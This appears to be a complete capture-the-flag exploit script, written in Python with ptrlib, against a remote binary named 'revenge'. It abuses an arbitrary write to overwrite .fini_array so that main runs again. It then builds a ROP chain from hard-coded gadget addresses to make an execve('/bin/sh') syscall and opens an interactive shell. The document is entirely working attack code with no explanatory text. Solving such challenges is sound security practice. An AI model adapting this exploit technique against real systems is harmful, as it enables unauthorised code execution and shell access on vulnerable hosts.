from ptrlib import *
import time

rop_leave_ret = 0x400cc3
rop_retn_3e8 = 0x00463567
rop_ret = 0x0040042e
rop_pop_rax = 0x00415764
rop_pop_rdx = 0x0044bee6
rop_pop_rsi = 0x004103b3
rop_pop_rdi = 0x004006f6
rop_syscall = 0x0040133c

addr_fini = 0x401a40
addr_fini_array = 0x6d1150
addr_main = 0x400c00
addr_stack = 0x6d1160
addr_binsh = 0x6d1250

def overwrite(addr, data):
    assert addr & 0xff == 0x50
    sock.sendline(str(addr))
    sock.send(data)
    sock.recvline()
    return

while True:
    #sock = Process("./revenge")
    sock = Socket("prob.vulnerable.kr", 20037)

    overwrite(addr_fini_array, p64(addr_fini) + p64(addr_main))
    if b'***' in sock.recvline(timeout=0.5):
        sock.close()
        continue

    logger.info("OK. sending payload...")
    overwrite(addr_binsh,
              b"/bin/sh\x00")
    overwrite(addr_fini_array + 0x400 * 4,
              p64(addr_binsh) + p64(rop_retn_3e8) + p64(rop_syscall))
    overwrite(addr_fini_array + 0x400 * 3,
              p64(0) + p64(rop_retn_3e8) + p64(rop_pop_rdi))
    overwrite(addr_fini_array + 0x400 * 2,
              p64(0) + p64(rop_retn_3e8) + p64(rop_pop_rdx))
    overwrite(addr_fini_array + 0x400,
              p64(0x3b) + p64(rop_retn_3e8) + p64(rop_pop_rsi))
    overwrite(addr_fini_array,
              p64(rop_leave_ret) + p64(rop_retn_3e8) + p64(rop_pop_rax))
    sock.interactive()
    exit(0)
